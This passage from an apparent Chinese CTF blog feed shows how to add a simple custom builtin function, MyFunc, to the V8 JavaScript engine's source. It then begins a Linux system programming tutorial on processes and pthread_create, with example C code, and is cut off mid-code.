href="http://BUILD.xn--bazelBUILD-lh7q.gn">BUILD.bazel和BUILD.gn</a></h3><ul><li>用于定义如何构建、编译和链接 V8 项目的各个模块和文件。</li><li>也就是这些文件用于要构建、编译和链接的V8项目的源文件，所以我们在<code>src</code>中新建一个文件，这时我们就要将这个文件的路径写入，到这两个文件中，这样我们自定义的功能才能被编译</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217213331952.png" alt="image-20250217213331952"></p><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217213348299.png" alt="image-20250217213348299"></p><h3 id="builtins-definitionsh"><a class="markdownIt-Anchor" href="#builtins-definitionsh"></a> builtins-definitions.h</h3><ul><li><code>builtins-definitions.h</code>，文件：这个文件主要就是定义<code>JavaScript</code>的内置类型、方法与函数，包括基本类型，比如：<code>整数</code>、<code>浮点数</code>、<code>布尔值</code>、<code>数组</code>、<code>字符串</code>。</li><li>例如下面的代码定义了一些数组的操作：比如<code>ArrayPop</code>，就是对数组的操作。</li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217210529358.png" alt="image-20250217210529358"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码:488行-499行</span></span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.pop */</span>                                           \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayPop, kDontAdaptArgumentsSentinel)                                   \</span><br><span class="line">  <span class="built_in">TFJ</span>(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.push */</span>                                          \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayPush, kDontAdaptArgumentsSentinel)                                  \</span><br><span class="line">  <span class="built_in">TFJ</span>(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.shift */</span>                                         \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayShift, kDontAdaptArgumentsSentinel)                                 \</span><br><span class="line">  <span class="comment">/* ES6 #sec-array.prototype.unshift */</span>                                       \</span><br><span class="line">  <span class="built_in">CPP</span>(ArrayUnshift, kDontAdaptArgumentsSentinel)                               \</span><br><span class="line">  <span class="comment">/* Support for Array.from and other array-copying idioms */</span>                  \</span><br><span class="line">  <span class="built_in">TFS</span>(CloneFastJSArray, NeedsContext::kYes, kSource)                           \</span><br></pre></td></tr></table></figure><ul><li>在源码中有<code>CPP</code>、<code>TFJ</code>、<code>TFS</code>这三个宏定义，还有<code>ASM()</code>等宏定义。接下来简单介绍一下前三个宏定义。<strong>我们编写内置函数是使用CPP编写，编写其具体功能</strong>。</li><li>而<code>CPP</code>、<code>TFJ</code>、<code>TFS</code>这三个宏定义主要决定的是这个函数使用的是<code>编译执行</code>还是<code>解释执行</code>，他们是决定了内建函数如何在 V8 引擎内部执行（编译执行、解释执行、JIT 优化、辅助优化等）</li><li>然后介绍一下这个文件中的相关参数：<ul><li><p><code>CPP</code>宏定义中的相关参数：</p><ul><li><code>ArrayPop</code>：</li><li><code>kDontAdaptArgumentsSentinel</code>：</li></ul></li><li><p><code>TFJ</code>宏定义相关参数：</p><ul><li><code>ArrayPrototypePush</code>：</li><li><code>kDontAdaptArgumentsSentinel</code>：</li></ul></li><li><p><code>TFS</code>宏定义相关参数：</p><ul><li><code>CloneFastJSArray</code>：</li><li><code>NeedsContext::kYes</code>：</li><li><code>kSource</code>：</li></ul></li></ul></li></ul><h3 id="bootstrappercc"><a class="markdownIt-Anchor" href="#bootstrappercc"></a> <a href="http://bootstrapper.cc">bootstrapper.cc</a></h3><ul><li>初始化和引导 V8 引擎的运行。它是 V8 启动过程中的核心部分之一，负责执行引擎的初始化和配置工作。</li><li>在这里我们就分析一个比较重要的方法：我们从源码可以看到这个方法从<code>2269</code>行到<code>5051</code>行，占这个文件非常大一部分。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(DirectHandle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                               DirectHandle&lt;JSFunction&gt; empty_function)</span></span></span><br></pre></td></tr></table></figure><ul><li>我们对数组一些操作的实现，会这这个方法中的里面进行初始化的配置，这样一些名称等都会被初始化，我们才能通过像这样<code>arr.pop()</code>关键字方法使用该功能，这边的<code>&#123;&#125;</code>并不代表函数，只是将一些列操作或者方法给集合在一起，这样就更方便查找。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findIndex&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindIndex, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findLast&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindLast, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;findLastIndex&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeFindLastIndex, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;lastIndexOf&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeLastIndexOf, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;pop&quot;</span>, Builtin::kArrayPrototypePop,</span><br><span class="line">                          <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;push&quot;</span>, Builtin::kArrayPrototypePush,</span><br><span class="line">                          <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;reverse&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeReverse, <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;shift&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeShift, <span class="number">0</span>, kDontAdapt);</span><br><span class="line">    <span class="built_in">SimpleInstallFunction</span>(isolate_, proto, <span class="string">&quot;unshift&quot;</span>,</span><br><span class="line">                          Builtin::kArrayPrototypeUnshift, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来介绍一下<code>SimpleInstallFunction</code>相关参数的具体含义：<ul><li><code>isolate_</code>：</li><li><code>proto</code>：</li><li><code>&quot;findIndex&quot;</code>：</li><li><code>Builtin::kArrayPrototypeFindLastIndex</code>：</li><li><code>kDontAdapt</code>：</li></ul></li></ul><h3 id="turbofan-typercc"><a class="markdownIt-Anchor" href="#turbofan-typercc"></a> <a href="http://turbofan-typer.cc">turbofan-typer.cc</a></h3><ul><li><p>这里简单介绍一下<code>turbofan</code>，<code>turbofan</code>是一个编译器，可以将字节码编译为CPU可以直接执行的机器码。</p></li><li><p>这个文件算是一个编译器优化，就添加如下形式就行：</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第1851行</span></span><br><span class="line"><span class="keyword">switch</span> (function.<span class="built_in">shared</span>(t-&gt;<span class="built_in">broker</span>()).<span class="built_in">builtin_id</span>()) &#123;</span><br><span class="line"><span class="comment">// 在上面这个switch中添加下面内容:</span></span><br><span class="line"><span class="keyword">case</span> Builtin::kMyFunc:</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">Number</span>();</span><br></pre></td></tr></table></figure><ul><li>接下来介绍一下具体这个函数的具体含义：<ul><li><code>function.shared(t-&gt;broker()).builtin_id()</code>：</li><li><code>Builtin::kMyFunc</code>：</li><li><code>Type::Number()</code>：</li></ul></li></ul><h2 id="添加myfunc全局函数"><a class="markdownIt-Anchor" href="#添加myfunc全局函数"></a> 添加MyFunc()全局函数</h2><h3 id="新建全局函数文件"><a class="markdownIt-Anchor" href="#新建全局函数文件"></a> 新建全局函数文件</h3><ul><li>在创建全局函数的时候我们会在这个文件目录下创建这样的文件<code>src/builtins/builtins-xxx.cc</code>，这里面编写的就是这个函数具体实现的功能</li><li>所以我们就先创建一个<code>src/builtins/builtins-myfunc.cc</code>文件，在文件中写入如下代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/builtins/builtins-utils-inl.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"><span class="keyword">namespace</span> internal &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">BUILTIN</span>(MyFunc) &#123;</span><br><span class="line">        <span class="function">HandleScope <span class="title">scope</span><span class="params">(isolate)</span></span>;</span><br><span class="line">        Handle&lt;Object&gt; value = args.<span class="built_in">atOrUndefined</span>(isolate, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 判断参数是否为基本类型</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsJSPrimitiveWrapper</span>(*value)) &#123;</span><br><span class="line">            value = <span class="built_in">handle</span>(<span class="built_in">Cast</span>&lt;JSPrimitiveWrapper&gt;(value)-&gt;<span class="built_in">value</span>(), isolate);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 判断参数是否为数字</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">IsNumber</span>(*value)) &#123;</span><br><span class="line">            <span class="built_in">THROW_NEW_ERROR_RETURN_FAILURE</span>(</span><br><span class="line">                    isolate, <span class="built_in">NewTypeError</span>(MessageTemplate::kArgumentIsNotUndefinedOrInteger,</span><br><span class="line">                                          isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewStringFromAsciiChecked</span>(</span><br><span class="line">                                                  <span class="string">&quot;My.Func&quot;</span>),</span><br><span class="line">                                          isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">Number_string</span>()));</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 将Object转换为浮点数</span></span><br><span class="line">        <span class="type">double</span> <span class="type">const</span> value_number = Object::<span class="built_in">NumberValue</span>(*value);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> *isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(value_number + <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加源文件"><a class="markdownIt-Anchor" href="#添加源文件"></a> 添加源文件</h3><ul><li>然后我们在<code>BUILD.bazel</code>和<code>BUILD.gn</code>这两个文件中添加我们新建的文件，如果是在开发中最好是按照顺序添加，这样会保证顺序不会乱</li></ul><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//BUILD.bazel</span><br><span class="line"><span class="meta">@@ -1367,6 +1367,7 @@</span> filegroup(</span><br><span class="line">         &quot;src/builtins/builtins-global.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+        &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">         &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">         &quot;src/builtins/builtins-promise.h&quot;,</span><br><span class="line">BUILD.gn</span><br><span class="line">// </span><br><span class="line"><span class="meta">@@ -5289,6 +5289,7 @@</span> v8_source_set(&quot;v8_base_without_compiler&quot;) &#123;</span><br><span class="line">     &quot;src/builtins/builtins-internal.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-intl.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-json.cc&quot;,</span><br><span class="line"><span class="addition">+    &quot;src/builtins/builtins-myfunc.cc&quot;,</span></span><br><span class="line">     &quot;src/builtins/builtins-number.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-object.cc&quot;,</span><br><span class="line">     &quot;src/builtins/builtins-reflect.cc&quot;,</span><br></pre></td></tr></table></figure><ul><li>然后在这个文件<code>builtins-definitions.h</code>中添加</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CPP</span>(MyFunc, kDontAdaptArgumentsSentinel)      </span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217222825643.png" alt="image-20250217222825643"></p><h3 id="初始化函数"><a class="markdownIt-Anchor" href="#初始化函数"></a> 初始化函数</h3><ul><li>然后在这个文件中<code>bootstrapper.cc</code>，添加如下代码，注意这边需要在</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意需要再这个方法里面添加</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Genesis::InitializeGlobal</span><span class="params">(DirectHandle&lt;JSGlobalObject&gt; global_object,</span></span></span><br><span class="line"><span class="params"><span class="function">                               DirectHandle&lt;JSFunction&gt; empty_function)</span> </span>&#123;</span><br><span class="line">&#123;  <span class="comment">// -- M y F u n c</span></span><br><span class="line">  <span class="built_in">SimpleInstallFunction</span>(isolate_, global_object, <span class="string">&quot;MyFunc&quot;</span>, Builtin::kMyFunc, <span class="number">1</span>, kDontAdapt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217223223065.png" alt="image-20250217223223065"></p><h3 id="设置函数优化"><a class="markdownIt-Anchor" href="#设置函数优化"></a> 设置函数优化</h3><ul><li>最后在这个文件中添加<code>turbofan-typer.cc</code>如下代码，需要再<code>switch</code>内部中加入：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (function.<span class="built_in">shared</span>(t-&gt;<span class="built_in">broker</span>()).<span class="built_in">builtin_id</span>()) &#123;</span><br><span class="line"><span class="keyword">case</span> Builtin::kMyFunc:</span><br><span class="line">    <span class="keyword">return</span> Type::<span class="built_in">Number</span>();</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217223541411.png" alt="image-20250217223541411"></p><ul><li>这些都添加完之后就可以编译源码了，编译后就可以使用自定义的内置函数<code>MyFunc()</code></li></ul><p><img src="/2025/02/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Chrome_v8_pwn/Chrome-v8-%E5%85%A5%E9%97%A8/image-20250217231653794.png" alt="image-20250217231653794"></p><h1 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h1>]]></content>
    
    
    <summary type="html">前言：牢QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux系统编程1</title>
    <link href="http://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/"/>
    <id>http://iyheart.github.io/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/</id>
    <published>2025-02-23T17:03:25.000Z</published>
    <updated>2025-02-24T12:58:33.869Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>Linux</code>系统编程</li></ul><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><ul><li>使用<code>man</code>命令，可以查看<code>Linux</code>手册，<code>man</code>是<code>manual</code>的命令缩写，其中文意思就是<code>手册</code>的意思。</li><li>我们要查看一个<code>命令</code>或<code>函数</code>的使用方法，我们就可以使用<code>man 命令</code>或<code>man 函数</code></li><li>例如：我们要查看<code>getpid</code>的用法，就可以执行<code>man getpid</code>，就可以查看手册中<code>getpid</code>这个函数的用法</li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224012228588.png" alt="image-20250224012228588"></p><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224012456624.png" alt="image-20250224012456624"></p><ul><li><p>在<code>OS</code>中进程是一个非常重要的概念，之后能让我们更方便理解进程，我们就先介绍另一个命令<code>pstree</code>，这个命令我们用来查看操作系统的进程树。我们可以使用<code>进程树</code>来辅助理解或者调试一些程序。<code>pstree</code>这个命令有一些相关的参数，接下来介绍一些常用的参数。</p><ul><li><code>-p</code>：输出进程树，并且会输出进程号</li><li><code>-a</code>：显示进程树，并且显示每个进程对应的目录文件</li></ul></li><li><p>接下来我们使用<code>pstree -p</code>命令查看一下具体的进程树：</p></li></ul><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224013520032.png" alt="image-20250224013520032"></p><h1 id="fork函数"><a class="markdownIt-Anchor" href="#fork函数"></a> fork()函数</h1><ul><li>在理解<code>fork</code>函数之前我们先需要介绍一下进程，在操作系统中我们在运行中的程序就相当于一个<strong>进程</strong>，而每个进程都会有一个进程号（pid），并且进程具有树状关系，一个进程可以创建一个新进程，而这个新进程就相当于是该进程的一个<strong>子进程</strong>。</li><li>在一个进程中，我们可以使用<code>getpid()</code>获取当前进程所对应的进程号，我们还可以使用<code>getppid()</code>获取当前进程所对应父进程的进程号。</li></ul><h1 id="线程相关"><a class="markdownIt-Anchor" href="#线程相关"></a> 线程相关</h1><h2 id="pthread_create函数"><a class="markdownIt-Anchor" href="#pthread_create函数"></a> pthread_create()函数</h2><ul><li><p>会详细介绍<code>pthread_create</code>函数还会详细介绍<code>pthread_join()</code>函数</p></li><li><p><code>pthread_create()</code>，这个函数是Linux系统提供的一个函数，作用是在当前进程中创建一个线程。接下来说明一下这个函数是如何使用的。</p><ul><li>首先要使用这个函数，首先要包含头文件<code>#include&lt;pthread.h&gt;</code>。</li><li>使用<code>gcc</code>编译链接的时候还需要使用<code>-pthread</code>命令来进行编译。</li><li>这个函数的功能：在我们调用<code>pthread_create()</code>函数的进程中，就会在该进程中调用一个线程。这个线程会开始执行下面<code>pthread_create()</code>函数中第<code>3</code>个参数（即函数指针）指向的函数。</li><li>注意：<strong>被指向的函数也有要求，这个函数参数要求传递<code>void *</code>，返回值也要求是<code>void *</code>，但是这并不意味着这个函数没有传递参数，具体请看下面例子</strong>，即指向<code>void</code>类型的指针。这个指针所指向的函数就是我们线程要执行的内容。</li></ul></li><li><p>现在说明一下这个函数的<code>参数</code>和<code>返回值</code>：</p><ul><li><code>pthread_t类型</code>：实际上该类型就是一个<code>无符号整型</code>，只是使用了这个语句进行定义<code>typedef unsigned long int pthread_t;</code></li><li><code>pthread_t *thread</code>：传入的是一个指向<code>线程ID</code>的指针。这也就是说，我们可以自定义<code>线程ID</code>，并不像创建一个子进程，这个进程号是系统给的。</li><li><code>pthread_attr_t *attr</code>：<code>pthread_attr_t</code>是一个结构体，所以<code>*attr</code>是结构体类型的指针，其指向的是<code>pthread_attr_t</code>。这个结构体指针，这个参数就是用来决定新线程的属性。如果该线程没有属性，就使用<code>NULL</code>作为参数。</li><li><code>void *(*start_routine)(void *)</code>：<code>start_routine</code>是一个函数指针，这个指针指向的函数地址就是线程要执行的内容。</li><li><code>void *arg</code>：传递给线程函数的参数，没有任何参数就填<code>NULL</code></li><li>返回值：创建成功就会返回<code>0</code>，创建失败就会返回一个特定的<code>非零值</code>。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span></span><br><span class="line">    <span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr, <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure><h3 id="level_1"><a class="markdownIt-Anchor" href="#level_1"></a> level_1</h3><ul><li>接下来举一个例子：<ul><li>就是创建一个线程，使得线程执行<code>thread_function</code></li><li>但是这个代码的执行结果不符合我们的预期，原因是进程创建完线程就结束了，进程结束会导致线程也被终止，线程是依赖于进程的，其资源属于进程</li><li>所以这时我们需要在创建完线程后，让进程执行<code>while</code>循环，以确保进程不结束，这样就得到了预期结果</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">pthread_t</span> pthread;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        ret = pthread_create(&amp;pthread, <span class="literal">NULL</span>, thread_function, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>); <span class="comment">// 之后添加的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread_function</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread begins running\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">                sleep(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/24/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97blog/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B1/image-20250224190908851.png" alt="image-20250224190908851"></p><h3 id="level_2"><a class="markdownIt-Anchor" href="#level_2"></a> level_2</h3><ul><li>但是这个代码还是有问题，因为线程进入死循环了，现在我们继续修改这个代码，使得线程有限次循环。</li><li>但是还会出现问题，这个线程结束后进程还会在等待中，这样程序一直不会结束</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 6_thread,c -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 